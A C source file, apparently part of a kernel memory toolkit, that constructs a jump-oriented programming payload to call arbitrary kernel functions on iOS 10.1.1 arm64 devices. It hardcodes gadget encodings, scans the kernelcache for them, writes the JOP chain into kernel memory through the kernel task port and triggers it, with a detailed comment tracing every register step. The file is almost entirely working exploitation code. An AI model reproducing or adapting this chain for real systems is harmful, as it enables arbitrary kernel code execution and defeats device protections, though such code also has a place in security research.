#include "aarch64/kernel_call_aarch64.h"
/*
 * Kernel Function Call Strategy
 * -----------------------------
 *
 * In order to call arbitrary kernel functions with 8 64-bit arguments and get the 64-bit return
 * value in user space, we construct a Jump-Oriented Program to perform a single function call and
 * store the result in kernel memory.
 *
 * We use a JOP payload rather than a ROP payload in order to preserve the kernel stack,
 * simplifying cleanup and making the program more modular.
 *
 * Currently the gadgets are all hardcoded from the iOS 10.1.1 14B100 kernelcache on n71 and d10.
 * As such, there is no guarantee that the required gadgets will be available on other builds or
 * platforms. In the future, I hope to implement a system of disassembling the kernelcache to look
 * for suitable gadgets from which to build a JOP function call payload, or even create a framework
 * to perform arbitrary computation within a JOP payload.
 *
 * The JOP payload is set up by writing the JOP stack (called JOP_STACK) and the value stack
 * (called VALUE_STACK) into kernel memory. Then kernel_call_7 is used to initialize registers and
 * jump to the first gadget, which sets up the necessary context to start executing from JOP_STACK.
 *
 * The most important JOP gadget is the dispatcher. Currently, I am using this incredibly useful
 * gadget from com.apple.filesystems.apfs:
 *
 * 	ldp     x2, x1, [x1]
 * 	br      x2
 *
 * This gadget loads x2 and x1 with the 2 64-bit words at the address in x1, then jumps to x2.
 * Since the load overwrites the dereferenced register x1, we can implement our JOP stack as a
 * linked list, where the first pointer in each node is the gadget to execute and the second
 * pointer is the address of the next node. We can chain the execution of the gadgets as long as
 * each gadget jumps back to the dispatcher.
 *
 * The listing below is a complete description of the code executed in the kernel to perform the
 * function call, starting from kernel_call_7.
 *
 * --------------------------------------------------------------------------------
 *
 * kernel_call_7
 * 	x0 = VALUE_STACK
 * 	x1 = JOP_STACK
 * 	x2 = MOV_X8_X4__BR_X5
 * 	x3 = MOV_X2_X30__BR_X12
 * 	x4 = JOP_DISPATCH = LDP_X2_X1_X1__BR_X2
 * 	x5 = MOV_X21_X2__BR_X8
 * 	pc = MOV_X12_X2__BR_X3
 *
 * mov x12, x2 ; br x3
 * 	x12 = MOV_X8_X4__BR_X5
 * 	pc = MOV_X2_X30__BR_X12
 *
 * mov x2, x30 ; br x12
 * 	x2 = RETURN_ADDRESS
 * 	pc = MOV_X8_X4__BR_X5
 *
 * mov x8, x4 ; br x5
 * 	x8 = JOP_DISPATCH
 * 	pc = MOV_X21_X2__BR_X8
 *
 * mov x21, x2 ; br x8
 * 	x21 = RETURN_ADDRESS
 * 	pc = JOP_DISPATCH
 *
 * ldp x2, x1, [x1] ; br x2
 * 	pc = MOV_X20_X0__BLR_X8
 *
 * mov x20, x0 ; blr x8
 * 	x20 = VALUE_STACK
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X10_X4__BR_X8
 *
 * mov x10, x4 ; br x8
 * 	x10 = JOP_DISPATCH
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X9_X10__BR_X8
 *
 * mov x9, x10 ; br x8
 * 	x9 = JOP_DISPATCH
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X11_X9__BR_X8
 *
 * mov x11, x9 ; br x8
 * 	x11 = JOP_DISPATCH
 * 	pc = JOP_DISPATCH
 * 	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 * ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 * 	x3 = VALUE_STACK[20] = LDP_X8_X1_X20_10__BLR_X8
 * 	x4 = VALUE_STACK[28] = MOV_X30_X28__BR_X12
 * 	x5 = VALUE_STACK[30]
 * 	x6 = VALUE_STACK[38] = STORE_RESUME
 * 	pc = JOP_DISPATCH
 * 	pc = ADD_X20_X20_34__BR_X8
 *
 * add x20, x20, #0x34 ; br x8
 * 	x20 += 0x34
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X22_X6__BLR_X8
 *
 * mov x22, x6 ; blr x8
 * 	x22 = STORE_RESUME
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X24_X4__BR_X8
 *
 * mov x24, x4 ; br x8
 * 	x24 = MOV_X30_X28__BR_X12
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X0_X3__BLR_X8
 *
 * mov x0, x3 ; blr x8
 * 	x0 = LDP_X8_X1_X20_10__BLR_X8
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X28_X0__BLR_X8
 *
 * mov x28, x0 ; blr x8
 * 	x28 = LDP_X8_X1_X20_10__BLR_X8
 * 	pc = JOP_DISPATCH
 * 	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 * ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 * 	x3 = VALUE_STACK[54] = <func>
 * 	x4 = VALUE_STACK[5c]
 * 	x5 = VALUE_STACK[64] = <arg7>
 * 	x6 = VALUE_STACK[6c]
 * 	pc = JOP_DISPATCH
 * 	pc = ADD_X20_X20_34__BR_X8
 *
 * add x20, x20, #0x34 ; br x8
 * 	x20 += 0x34
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X12_X3__BR_X8
 *
 * mov x12, x3 ; br x8
 * 	x12 = <func>
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X0_X5__BLR_X8
 *
 * mov x0, x5 ; blr x8
 * 	x0 = <arg7>
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X9_X0__BR_X11
 *
 * mov x9, x0 ; br x11
 * 	x9 = <arg7>
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X7_X9__BLR_X11
 *
 * mov x7, x9 ; blr x11
 * 	x7 = <arg7>
 * 	pc = JOP_DISPATCH
 * 	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 * ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 * 	x3 = VALUE_STACK[88] = <arg1>
 * 	x4 = VALUE_STACK[90] = <arg2>
 * 	x5 = VALUE_STACK[98] = <arg0>
 * 	x6 = VALUE_STACK[a0]
 * 	pc = JOP_DISPATCH
 * 	pc = ADD_X20_X20_34__BR_X8
 *
 * add x20, x20, #0x34 ; br x8
 * 	x20 += 0x34
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X0_X3__BLR_X8
 *
 * mov x0, x3 ; blr x8
 * 	x0 = <arg1>
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X9_X0__BR_X11
 *
 * mov x9, x0 ; br x11
 * 	x9 = <arg1>
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X10_X4__BR_X8
 *
 * mov x10, x4 ; br x8
 * 	x10 = <arg2>
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X0_X5__BLR_X8
 *
 * mov x0, x5 ; blr x8
 * 	x0 = <arg0>
 * 	pc = JOP_DISPATCH
 * 	pc = LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8
 *
 * ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8
 * 	x3 = VALUE_STACK[bc] = <arg3>
 * 	x4 = VALUE_STACK[c4] = <arg4>
 * 	x5 = VALUE_STACK[cc] = <arg5>
 * 	x6 = VALUE_STACK[d4] = <arg6>
 * 	pc = JOP_DISPATCH
 * 	pc = ADD_X20_X20_34__BR_X8
 *
 * add x20, x20, #0x34 ; br x8
 * 	x20 += 0x34
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X11_X24__BR_X8
 *
 * mov x11, x24 ; br x8
 * 	x11 = MOV_X30_X28__BR_X12
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X1_X9__MOV_X2_X10__BLR_X11
 *
 * mov x1, x9 ; mov x2, x10 ; blr x11
 * 	x1 = <arg1>
 * 	x2 = <arg2>
 * 	pc = MOV_X30_X28__BR_X12
 *
 * mov x30, x28 ; br x12
 * 	x30 = LDP_X8_X1_X20_10__BLR_X8
 * 	pc = <func>
 * 	x0 = <result>
 * 	pc = LDP_X8_X1_X20_10__BLR_X8
 *
 * ldp x8, x1, [x20, #0x10] ; blr x8
 * 	x8 = VALUE_STACK[e0] = JOP_DISPATCH
 * 	x1 = VALUE_STACK[e8] = JOP_STACK
 * 	pc = JOP_DISPATCH
 * 	pc = STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8
 *
 * str x0, [x20] ; ldr x8, [x22] ; ldr x8, [x8, #0x28] ; mov x0, x22 ; blr x8
 * 	VALUE_STACK[d0] = <result>
 * 	x8 = STORE_RESUME[0] = STORE_RESUME+8-28
 * 	x8 = (STORE_RESUME+8-28)[28] = JOP_DISPATCH
 * 	x0 = STORE_RESUME
 * 	pc = JOP_DISPATCH
 * 	pc = MOV_X30_X21__BR_X8
 *
 * mov x30, x21 ; br x8
 * 	x30 = RETURN_ADDRESS
 * 	pc = JOP_DISPATCH
 * 	pc = RET
 *
 * ret
 * 	pc = RETURN_ADDRESS
 *
 * --------------------------------------------------------------------------------
 *
 * Because the JOP_STACK is constant (only the data loaded from VALUE_STACK changes), it is
 * possible to set up the JOP payload in kernel memory during initialization, then overwrite the
 * function and arguments in the value stack as necessary. However, at least initially, we will
 * overwrite the full JOP payload on each function call. (TODO: Revisit this decision.)
 *
 * The JOP payload is laid out as follows:
 *
 * 	jop_payload      100              200              300              400
 * 	+----------------+----------------+----------------+----------------+
 * 	| VALUE_STACK    : STORE_RESUME   : JOP_STACK                       |
 * 	+----------------+----------------+----------------+----------------+
 *
 * VALUE_STACK is the stack of values that will be loaded into registers using the load gadget. The
 * JOP payload calls the load/advance gadget combination 4 times, advancing the VALUE_STACK
 * register by 0x34 each time. Then, after the function call, the VALUE_STACK is read for function
 * call recovery and written to to store the result. The overall layout of the VALUE_STACK is:
 *
 * 	VALUE_STACK         10                  20                  30   34             40
 * 	+---------+---------+---------+---------+---------+---------+----+----+---------+
 * 	|         |         |         |         | MOV_X8_ | MOV_X30 | _______ | STORE_R |  >---+
 * 	+---------+---------+---------+---------+---------+---------+----+----+---------+      |
 * 	                                                                                       |
 * 	   +-----------------------------------------------------------------------------------+
 * 	   |
 * 	   V
 * 	34             40   44                  54                  64   68             74
 * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 * 	____ | STORE_R |    :         :         : <func>  : _______ : <arg7>  : _______ :  >---+
 * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+      |
 * 	                                                                                       |
 * 	   +-----------------------------------------------------------------------------------+
 * 	   |
 * 	   V
 * 	68             74   78                  88                  98   9c             a8
 * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 * 	g7>  : _______ :    |         |         | <arg1>  | <arg2>  | <arg0>  | _______ |  >---+
 * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+      |
 * 	                                                                                       |
 * 	   +-----------------------------------------------------------------------------------+
 * 	   |
 * 	   V
 * 	9c             a8   ac                  bc                  cc   d0             dc
 * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+
 * 	g0>  | _______ |    :         :         : <arg3>  : <arg4>  : <arg5>  : <arg6>  :  >---+
 * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+      |
 * 	                                                                                       |
 * 	   +-----------------------------------------------------------------------------------+
 * 	   |
 * 	   V
 * 	d0             dc   e0                  f0                  100
 * 	+----+---------+----+---------+---------+---------+---------+
 * 	g5>  : <arg6>  :    | JOP_DIS | JOP_STA |         |         |
 * 	+----+----+----+----+---------+---------+---------+---------+
 * 	^^^^^^^^^^^
 * 	| <result |
 * 	+---------+
 *
 * Thus, the part of the JOP payload that varies is VALUE_STACK+0x54 to VALUE_STACK+0xdc, and the
 * result can be read from VALUE_STACK+0xd0.
 *
 * STORE_RESUME is used to resume execution of the JOP_STACK after the store gadget:
 *
 * 	str     x0, [x20]
 * 	ldr     x8, [x22]
 * 	ldr     x8, [x8, #0x28]
 * 	mov     x0, x22
 * 	blr     x8
 *
 * To continue executing the JOP_STACK, x8 must be JOP_DISPATCH at the branch point. Thus, we can
 * use the following layout:
 *
 * 	STORE_RESUME            8                       10
 * 	+-----------------------+-----------------------+
 * 	| STORE_RESUME+0x8-0x28 |     JOP_DISPATCH      |
 * 	+-----------------------+-----------------------+
 *
 * Finally, the JOP_STACK is effectively a linked list of gadget pointers. The dispatch gadget is:
 *
 * 	ldp     x2, x1, [x1]
 * 	br      x2
 *
 * Thus we may organize the JOP_STACK as:
 *
 * 	JOP_STACK  8          10         18         20         28         30         38
 * 	+----------+----------+----------+----------+----------+----------+----------+
 * 	| gadget 0 |   +10    | gadget 1 |   +20    | gadget 2 |   +30    | gadget 3 | ...
 * 	+----------+----------+----------+----------+----------+----------+----------+
 *
 * The one tricky point is recovering from the function call. Once x1 is overwritten with arg1, the
 * rest of that JOP_STACK is lost. The call recovery gadget restores the JOP_STACK using the
 * VALUE_STACK:
 *
 * 	ldp     x8, x1, [x20, #0x10]
 * 	blr     x8
 *
 * Thus, the corresponding element of VALUE_STACK must point to the rest of the JOP_STACK.
 *
 * Note that the preceding organization for the JOP payload is not very space efficient: there are
 * lots of gaps that could be packed to make the JOP payload take significantly less space.
 * However, because we are allocating memory with mach_vm_allocate which returns a whole number of
 * memory pages, we cannot save any memory by packing the payload densely. Thus, this inefficiency
 * is irrelevant.
 *
 */

#include "core.h"
#include "kernel_call.h"
#include "kernel_memory.h"
#include "kernel_slide.h"
#include "kernelcache.h"
#include "memctl_error.h"
#include "utility.h"

#include <mach/mach_vm.h>

/*
 * struct gadget
 *
 * Description:
 * 	A structure describing a gadget we need to implement kernel_call_aarch64.
 *
 * Notes:
 * 	Once a more general JOP payload generation framework is implemented, this structure will no
 * 	longer be necessary; we will instead disassemble all instructions and look for sequences
 * 	that match our criteria.
 */
struct gadget {
	// The runtime address of the gadget.
	uint64_t address;
	// A string representation of the gadget.
	const char *const str;
	// The number of instructions in the gadget.
	const uint32_t count;
	// The instructions in the gadget.
	const uint32_t *ins;
};

/*
 * gadgets
 *
 * Description:
 * 	The list of gadgets we need.
 */
#define GADGET(str, count, ...) { 0, str, count, (const uint32_t *) &(const uint32_t[count]) { __VA_ARGS__ } }
struct gadget gadgets[] = {
	GADGET("ldp x2, x1, [x1] ; br x2",          2, 0xa9400422, 0xd61f0040),
	GADGET("mov x12, x2 ; br x3",               2, 0xaa0203ec, 0xd61f0060),
	GADGET("mov x2, x30 ; br x12",              2, 0xaa1e03e2, 0xd61f0180),
	GADGET("mov x8, x4 ; br x5",                2, 0xaa0403e8, 0xd61f00a0),
	GADGET("mov x21, x2 ; br x8",               2, 0xaa0203f5, 0xd61f0100),
	GADGET("mov x20, x0 ; blr x8",              2, 0xaa0003f4, 0xd63f0100),
	GADGET("mov x10, x4 ; br x8",               2, 0xaa0403ea, 0xd61f0100),
	GADGET("mov x9, x10 ; br x8",               2, 0xaa0a03e9, 0xd61f0100),
	GADGET("mov x11, x9 ; br x8",               2, 0xaa0903eb, 0xd61f0100),
	GADGET("ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8",
	                                            3, 0xa9421283, 0xa9431a85, 0xd63f0100),
	GADGET("add x20, x20, #0x34 ; br x8",       2, 0x9100d294, 0xd61f0100),
	GADGET("mov x22, x6 ; blr x8",              2, 0xaa0603f6, 0xd63f0100),
	GADGET("mov x24, x4 ; br x8",               2, 0xaa0403f8, 0xd61f0100),
	GADGET("mov x0, x3 ; blr x8",               2, 0xaa0303e0, 0xd63f0100),
	GADGET("mov x28, x0 ; blr x8",              2, 0xaa0003fc, 0xd63f0100),
	GADGET("mov x12, x3 ; br x8",               2, 0xaa0303ec, 0xd61f0100),
	GADGET("mov x0, x5 ; blr x8",               2, 0xaa0503e0, 0xd63f0100),
	GADGET("mov x9, x0 ; br x11",               2, 0xaa0003e9, 0xd61f0160),
	GADGET("mov x7, x9 ; blr x11",              2, 0xaa0903e7, 0xd63f0160),
	GADGET("mov x11, x24 ; br x8",              2, 0xaa1803eb, 0xd61f0100),
	GADGET("mov x1, x9 ; mov x2, x10 ; blr x11",
	                                            3, 0xaa0903e1, 0xaa0a03e2, 0xd63f0160),
	GADGET("mov x30, x28 ; br x12",             2, 0xaa1c03fe, 0xd61f0180),
	GADGET("ldp x8, x1, [x20, #0x10] ; blr x8", 2, 0xa9410688, 0xd63f0100),
	GADGET("str x0, [x20] ; ldr x8, [x22] ; ldr x8, [x8, #0x28] ; mov x0, x22 ; blr x8",
	                                            5, 0xf9000280, 0xf94002c8, 0xf9401508,
	                                               0xaa1603e0, 0xd63f0100),
	GADGET("mov x30, x21 ; br x8",              2, 0xaa1503fe, 0xd61f0100),
	GADGET("ret",                               1, 0xd65f03c0)
};
#undef GADGET

// Named indices into the gadgets array.
enum {
	LDP_X2_X1_X1__BR_X2,
	MOV_X12_X2__BR_X3,
	MOV_X2_X30__BR_X12,
	MOV_X8_X4__BR_X5,
	MOV_X21_X2__BR_X8,
	MOV_X20_X0__BLR_X8,
	MOV_X10_X4__BR_X8,
	MOV_X9_X10__BR_X8,
	MOV_X11_X9__BR_X8,
	LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
	ADD_X20_X20_34__BR_X8,
	MOV_X22_X6__BLR_X8,
	MOV_X24_X4__BR_X8,
	MOV_X0_X3__BLR_X8,
	MOV_X28_X0__BLR_X8,
	MOV_X12_X3__BR_X8,
	MOV_X0_X5__BLR_X8,
	MOV_X9_X0__BR_X11,
	MOV_X7_X9__BLR_X11,
	MOV_X11_X24__BR_X8,
	MOV_X1_X9__MOV_X2_X10__BLR_X11,
	MOV_X30_X28__BR_X12,
	LDP_X8_X1_X20_10__BLR_X8,
	STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8,
	MOV_X30_X21__BR_X8,
	RET,
	GADGET_COUNT
};

/*
 * ngadgets
 *
 * Description:
 * 	The number of gadgets we have found so far.
 */
static unsigned ngadgets;

/*
 * jop_payload
 *
 * Description:
 * 	A block of kernel memory used to build the JOP payload.
 */
static kaddr_t jop_payload;

#define JOP_MEMORY_SIZE     0x400
#define VALUE_STACK_OFFSET  0
#define RESULT_OFFSET       0xd0
#define STORE_RESUME_OFFSET 0x100
#define JOP_STACK_OFFSET    0x200
#define LOAD_ADVANCE        0x34
#define STORE_RESUME_DELTA  (-0x28)

// Get the size of an array.
#define ARRSIZE(x)	(sizeof(x) / sizeof((x)[0]))

/*
 * find_gadgets_in_data
 *
 * Description:
 * 	Find gadgets in the given data.
 */
static void
find_gadgets_in_data(const void *data, uint64_t address, size_t size) {
	const uint32_t *ins = data;
	const uint32_t *end = ins + (size / sizeof(uint32_t));
	for (; ins < end; ins++) {
		for (struct gadget *g = gadgets; g < gadgets + GADGET_COUNT; g++) {
			// Skip this gadget if we've already found it or if there's not enough
			// space left for the gadget.
			if (g->address != 0 || (end - ins) < g->count) {
				continue;
			}
			// Skip this gadget if it's not a match.
			if (memcmp(g->ins, ins, g->count * sizeof(*ins)) != 0) {
				continue;
			}
			// Found a gadget! Set the address.
			g->address = address + (ins - (uint32_t *)data) * sizeof(*ins)
			           + kernel_slide;
			ngadgets++;
		}
	}
}

/*
 * find_gadgets_in_kext
 *
 * Description:
 * 	A kernelcache_for_each callback to find gadgets within a given kernel extension.
 */
static bool
find_gadgets_in_kext(void *context, CFDictionaryRef info,
		const char *bundle_id, kaddr_t base, size_t size0) {
	if (base == 0) {
		return false;
	}
	bool *success = (bool *)context;
	struct macho kext;
	kext_result kr = kernelcache_kext_init_macho_at_address(&kernelcache, &kext, base);
	if (kr != KEXT_SUCCESS) {
		error_internal("kernelcache_kext_init_macho_at_address failed for address "
		               "%llx returned by kernelcache_for_each", (long long)base);
		*success = false;
		return true;
	}
	const struct segment_command_64 *sc = NULL;
	for (;;) {
		if (ngadgets == GADGET_COUNT) {
			return true;
		}
		macho_find_load_command_64(&kext, (const struct load_command **)&sc,
				LC_SEGMENT_64);
		if (sc == NULL) {
			return false;
		}
		const int prot = VM_PROT_READ | VM_PROT_EXECUTE;
		if ((sc->initprot & prot) != prot || (sc->maxprot & prot) != prot) {
			continue;
		}
		const void *data;
		uint64_t address;
		size_t size;
		macho_segment_data_64(&kext, sc, &data, &address, &size);
		find_gadgets_in_data(data, address, size);
	}
}

/*
 * check_gadgets
 *
 * Description:
 * 	Check to make sure that all the required gadgets are present.
 */
static bool
check_gadgets() {
	for (struct gadget *g = gadgets; g < gadgets + GADGET_COUNT; g++) {
		if (g->address == 0) {
			error_functionality_unavailable(
					"kernel_call_aarch64: gadget '%s' not found", g->str);
			assert(ngadgets < GADGET_COUNT);
			return false;
		}
	}
	assert(ngadgets == GADGET_COUNT);
	return true;
}

/*
 * find_gadgets
 *
 * Description:
 * 	Initialize the gadgets used for the JOP payload.
 */
static bool
find_gadgets() {
	bool success = true;
	kernelcache_for_each(&kernelcache, find_gadgets_in_kext, &success);
	return (success && check_gadgets());
}

/*
 * build_jop_payload
 *
 * Description:
 * 	Build the JOP payload described at the top of this file.
 */
static bool
build_jop_payload(uint64_t func, uint64_t args[8]) {
	uint8_t payload[JOP_MEMORY_SIZE];
	// Initialize unused bytes of the payload to a distinctive byte pattern to make detecting
	// errors in panic logs easier.
	memset(payload, 0xba, sizeof(payload));
	// Set up STORE_RESUME.
	uint64_t store_resume = jop_payload + STORE_RESUME_OFFSET;
	uint64_t *store_resume_payload = (uint64_t *)(payload + STORE_RESUME_OFFSET);
	store_resume_payload[0] = store_resume + sizeof(uint64_t) + STORE_RESUME_DELTA;
	store_resume_payload[1] = gadgets[LDP_X2_X1_X1__BR_X2].address;
	// Set up JOP_STACK.
	// NOTE: The JOP_STACK contains 29 gadgets and runs from 0x200 to 0x3d0. If there are ever
	// more than 32 gadgets, JOP_STACK will need more space.
	const unsigned jop_call_chain_gadgets[] = {
		MOV_X20_X0__BLR_X8,
		MOV_X10_X4__BR_X8,
		MOV_X9_X10__BR_X8,
		MOV_X11_X9__BR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X22_X6__BLR_X8,
		MOV_X24_X4__BR_X8,
		MOV_X0_X3__BLR_X8,
		MOV_X28_X0__BLR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X12_X3__BR_X8,
		MOV_X0_X5__BLR_X8,
		MOV_X9_X0__BR_X11,
		MOV_X7_X9__BLR_X11,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X0_X3__BLR_X8,
		MOV_X9_X0__BR_X11,
		MOV_X10_X4__BR_X8,
		MOV_X0_X5__BLR_X8,
		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
		ADD_X20_X20_34__BR_X8,
		MOV_X11_X24__BR_X8,
		MOV_X1_X9__MOV_X2_X10__BLR_X11,
	};
	const unsigned jop_return_chain_gadgets[] = {
		STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8,
		MOV_X30_X21__BR_X8,
		RET,
	};
	struct dispatch_gadget {
		uint64_t x2;
		uint64_t x1;
	} *dispatch_gadget = (struct dispatch_gadget *)(payload + JOP_STACK_OFFSET);
	uint64_t jop_chain_next = jop_payload + JOP_STACK_OFFSET;
	for (size_t i = 0; i < ARRSIZE(jop_call_chain_gadgets); i++) {
		jop_chain_next += sizeof(*dispatch_gadget);
		dispatch_gadget->x2 = gadgets[jop_call_chain_gadgets[i]].address;
		dispatch_gadget->x1 = jop_chain_next;
		dispatch_gadget++;
	}
	uint64_t jop_return_chain = jop_chain_next;
	for (size_t i = 0; i < ARRSIZE(jop_return_chain_gadgets); i++) {
		jop_chain_next += sizeof(*dispatch_gadget);
		dispatch_gadget->x2 = gadgets[jop_return_chain_gadgets[i]].address;
		dispatch_gadget->x1 = jop_chain_next;
		dispatch_gadget++;
	}
	// Set up VALUE_STACK.
	struct load_gadget {
		uint64_t pad[4];
		uint64_t x3;
		uint64_t x4;
		uint64_t x5;
		uint64_t x6;
	} *load_gadget;
	struct call_recover_gadget {
		uint64_t pad[2];
		uint64_t x8;
		uint64_t x1;
	} *call_recover_gadget;
	load_gadget = (struct load_gadget *)(payload + VALUE_STACK_OFFSET);
	load_gadget->x3 = gadgets[LDP_X8_X1_X20_10__BLR_X8].address;
	load_gadget->x4 = gadgets[MOV_X30_X28__BR_X12].address;
	load_gadget->x6 = store_resume;
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = func;
	load_gadget->x5 = args[7];
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = func;
	load_gadget->x3 = args[1];
	load_gadget->x4 = args[2];
	load_gadget->x5 = args[0];
	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
	load_gadget->x3 = args[3];
	load_gadget->x4 = args[4];
	load_gadget->x5 = args[5];
	load_gadget->x6 = args[6];
	call_recover_gadget = (struct call_recover_gadget *)
		((uint8_t *)load_gadget + LOAD_ADVANCE);
	call_recover_gadget->x8 = gadgets[LDP_X2_X1_X1__BR_X2].address;
	call_recover_gadget->x1 = jop_return_chain;
	// Finally, write the payload into memory.
	size_t size = JOP_MEMORY_SIZE;
	kernel_io_result ior = kernel_write_unsafe(jop_payload, &size, payload, 0, NULL);
	if (ior != KERNEL_IO_SUCCESS) {
		error_internal("could not write JOP payload to kernel memory");
		return false;
	}
	return true;
}

/*
 * get_result
 *
 * Description:
 * 	Read the result from the kernel function call.
 */
static bool
get_result(void *result, size_t result_size) {
	uint64_t result64;
	kernel_io_result ior = kernel_read_word(kernel_read_unsafe, jop_payload + RESULT_OFFSET,
			&result64, sizeof(result64), 0);
	if (ior != KERNEL_IO_SUCCESS) {
		error_internal("could not read function call result from kernel memory");
		return false;
	}
	pack_uint(result, result64, result_size);
	return true;
}

bool
kernel_call_init_aarch64() {
	if (jop_payload != 0) {
		return true;
	}
	if (!find_gadgets()) {
		goto fail;
	}
	mach_vm_address_t address;
	kern_return_t kr = mach_vm_allocate(kernel_task, &address, JOP_MEMORY_SIZE,
			VM_FLAGS_ANYWHERE);
	if (kr != KERN_SUCCESS) {
		error_internal("mach_vm_allocate failed: %s", mach_error_string(kr));
		goto fail;
	}
	jop_payload = address;
	return true;
fail:
	kernel_call_deinit_aarch64();
	return false;
}

void
kernel_call_deinit_aarch64() {
	if (jop_payload != 0) {
		mach_vm_deallocate(kernel_task, jop_payload, JOP_MEMORY_SIZE);
		jop_payload = 0;
	}
}

bool
kernel_call_aarch64(void *result, unsigned result_size, unsigned arg_count,
		kaddr_t func, kword_t args[]) {
	assert(sizeof(kword_t) == sizeof(uint64_t));
	if (func == 0) {
		return true;
	}
	uint64_t args64[8] = { 0 };
	for (size_t i = 0; i < arg_count; i++) {
		args64[i] = args[i];
	}
	if (!build_jop_payload(func, args64)) {
		return false;
	}
	kword_t kc7args[6] = {
		jop_payload + VALUE_STACK_OFFSET,
		jop_payload + JOP_STACK_OFFSET,
		gadgets[MOV_X8_X4__BR_X5].address,
		gadgets[MOV_X2_X30__BR_X12].address,
		gadgets[LDP_X2_X1_X1__BR_X2].address,
		gadgets[MOV_X21_X2__BR_X8].address,
	};
	kword_t pc = gadgets[MOV_X12_X2__BR_X3].address;
	uint32_t result32;
	bool success = kernel_call_7(&result32, sizeof(result32), 6, pc, kc7args);
	if (!success) {
		return false;
	}
	if (result32 != ((jop_payload + STORE_RESUME_OFFSET) & 0xffffffff)) {
		memctl_warning("unexpected return value %x from kernel_call_7", result32);
	}
	if (!get_result(result, result_size)) {
		return false;
	}
	return true;
}
